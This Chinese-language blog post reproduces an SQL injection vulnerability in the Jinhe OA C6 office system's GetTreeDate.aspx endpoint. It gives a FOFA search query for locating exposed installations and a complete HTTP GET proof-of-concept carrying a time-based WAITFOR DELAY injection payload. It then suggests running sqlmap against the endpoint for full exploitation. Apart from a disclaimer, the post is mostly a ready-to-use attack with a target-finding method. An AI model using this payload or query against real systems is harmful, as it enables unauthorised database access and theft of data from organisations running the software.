# 原创
：  漏洞复现--金和OASQL注入

# 漏洞复现--金和OASQL注入

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

金和OA协同办公管理系统C6软件（简称金和OA），本着简单、适用、高效的原则，贴合企事业单位的实际需求，实行通用化、标准化、智能化、人性化的产品设计，充分体现企事业单位规范管理、提高办公效率的核心思想，为用户提供一整套标准的办公自动化解决方案，以帮助企事业单位迅速建立便捷规范的办公环境。该产品GetTreeDate.aspx存在SQL注入漏洞

### 二：漏洞影响版本

金和OA

### 三：网络空间测绘查询

fofa:<br/> `app="金和网络-金和OA"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/f0fa7c0ea246924f7142befe4e89cd92.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/51080d604810a57a4969704610beaf4e.jpeg"/><br/> POC:<br/> `GET /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1;WAITFOR+DELAY+%270:0:5%27+--%20and%201=1 HTTP/1.1 Host: IP:port User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: ASP.NET_SessionId=4nichsprxl5ruhtbk5lywfdb DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 `<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a9b38bb3df74d90a565898413148193c.jpeg"/><br/> 存在注入

### 五：漏洞利用

sqlmap直接梭哈<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/79d0907c86494ed56f1aa67b5b813b1f.jpeg"/>
